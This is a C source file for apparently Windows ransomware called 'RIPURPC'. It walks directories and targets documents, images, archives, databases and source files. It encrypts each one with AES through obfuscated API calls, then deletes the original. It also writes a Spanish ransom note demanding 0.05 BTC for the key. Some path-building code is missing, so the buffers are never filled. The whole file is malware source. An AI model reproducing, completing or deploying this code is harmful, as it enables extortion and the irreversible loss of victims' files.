#include "files.h"
#include "api.h"
#include "crypto.h"
#include "obfuscate.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const char *target_exts[] = {
    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".bmp",
    ".zip", ".rar", ".7z", ".tar", ".gz",
    ".mp3", ".mp4", ".avi", ".mkv", ".mov",
    ".sql", ".db", ".mdb", ".csv",
    ".psd", ".ai", ".svg",
    ".py", ".c", ".cpp", ".h", ".java", ".js", ".php",
    ".odt", ".ods", ".odp",
    NULL
};

BOOL is_target_ext(const char *name) {
    const char *dot = strrchr(name, '.');
    if (!dot) return FALSE;
    for (int i = 0; target_exts[i]; i++) {
        if (_stricmp(dot, target_exts[i]) == 0) return TRUE;
    }
    return FALSE;
}

BOOL is_excluded_dir(const char *name) {
    if (_stricmp(name, "AppData") == 0) return TRUE;
    if (_stricmp(name, "Application Data") == 0) return TRUE;
    if (_stricmp(name, "Local Settings") == 0) return TRUE;
    if (_stricmp(name, "Cookies") == 0) return TRUE;
    if (_stricmp(name, "NetHood") == 0) return TRUE;
    if (_stricmp(name, "PrintHood") == 0) return TRUE;
    if (_stricmp(name, "Recent") == 0) return TRUE;
    if (_stricmp(name, "SendTo") == 0) return TRUE;
    if (_stricmp(name, "Templates") == 0) return TRUE;
    if (_stricmp(name, "Start Menu") == 0) return TRUE;
    if (_stricmp(name, "My Documents") == 0) return TRUE;
    if (_stricmp(name, "History") == 0) return TRUE;
    if (_stricmp(name, "All Users") == 0) return TRUE;
    if (_stricmp(name, "Default") == 0) return TRUE;
    if (_stricmp(name, "Default User") == 0) return TRUE;
    if (_stricmp(name, "Public") == 0) return TRUE;
    if (_stricmp(name, "Microsoft") == 0) return TRUE;
    if (_stricmp(name, "Windows") == 0) return TRUE;
    if (_stricmp(name, "System32") == 0) return TRUE;
    return FALSE;
}

BOOL is_excluded(const char *name) {
    if (_stricmp(name, "key.bin") == 0) return TRUE;
    if (_stricmp(name, "README_RIPURPC.txt") == 0) return TRUE;
    if (_stricmp(name, "desktop.ini") == 0) return TRUE;
    if (_stricmp(name, "thumbs.db") == 0) return TRUE;
    if (_stricmp(name, "NTUSER.DAT") == 0) return TRUE;
    if (_strnicmp(name, "NTUSER.DAT.LOG", 14) == 0) return TRUE;
    if (_stricmp(name, "UsrClass.dat") == 0) return TRUE;
    if (_strnicmp(name, "UsrClass.dat.LOG", 16) == 0) return TRUE;
    if (strncmp(name, "~$", 2) == 0) return TRUE;
    const char *dot = strrchr(name, '.');
    if (dot && _stricmp(dot, ".RIPURPC") == 0) return TRUE;
    return FALSE;
}

BOOL process_file(const char *full_path) {

    HANDLE hIn = pCreateFileA(full_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    DWORD sz = pGetFileSize(hIn, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0) { pCloseHandle(hIn); return FALSE; }

    BYTE *plain = (BYTE*)malloc(sz);
    DWORD rd = 0;
    pReadFile(hIn, plain, sz, &rd, NULL);
    pCloseHandle(hIn);

    BYTE local_iv[16];
    NTSTATUS st = pBCryptGenRandom(NULL, local_iv, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    ULONG cbOut = 0;
    pBCryptEncrypt(hAesKey, plain, rd, NULL, local_iv, 16, NULL, 0, &cbOut, 0);

    BYTE *cipher = (BYTE*)malloc(cbOut);
    ULONG cbWritten = 0;
    st = pBCryptEncrypt(hAesKey, plain, rd, NULL, local_iv, 16, cipher, cbOut, &cbWritten, 0);

    char ext_enc[32];
    decodeString(s_ext_enc, s_ext_enc_len, ext_enc);

    char out_path[1024];

    HANDLE hOut = pCreateFileA(out_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut != INVALID_HANDLE_VALUE) {
        DWORD written = 0;
        pWriteFile(hOut, local_iv, 16, &written, NULL);
        pWriteFile(hOut, cipher, cbWritten, &written, NULL);
        pCloseHandle(hOut);
        pDeleteFileA(full_path);
    } else {
    }

    free(plain);
    free(cipher);
    return TRUE;
}

void write_ransom_note(const char *dir) {
    char path[1024];

    HANDLE h = pCreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;

    const char *note =
        "==============================================\r\n"
        "  TUS ARCHIVOS HAN SIDO CIFRADOS .RIPURPC\r\n"
        "==============================================\r\n"
        "\r\n"
        "Todos tus archivos importantes han sido cifrados\r\n"
        "con AES-256 + RSA-2048. No hay forma de recuperarlos\r\n"
        "sin la clave privada que solo nosotros tenemos.\r\n"
        "\r\n"
        "Para recuperar tus archivos:\r\n"
        "  1. Envia 0.05 BTC a: bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxx\r\n"
        "  2. Manda el comprobante a: ripurpc@onion\r\n"
        "  3. Recibiras la clave de descifrado en 24h\r\n"
        "\r\n"
        "NO intentes descifrar los archivos por tu cuenta.\r\n"
        "NO apagues el equipo.\r\n"
        "==============================================\r\n";

    DWORD written = 0;
    pWriteFile(h, note, (DWORD)strlen(note), &written, NULL);
    pCloseHandle(h);
}

void walk_directory(const char *root) {

    char pattern[1024];

    WIN32_FIND_DATAA fd;
    HANDLE hFind = pFindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;

        char full[1024];

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (is_excluded_dir(fd.cFileName)) {
                continue;
            }
            walk_directory(full);
        } else {
            if (is_excluded(fd.cFileName)) {
                continue;
            }
            if (!is_target_ext(fd.cFileName)) continue;
            process_file(full);
        }
    } while (pFindNextFileA(hFind, &fd));

    pFindClose(hFind);
    write_ransom_note(root);
}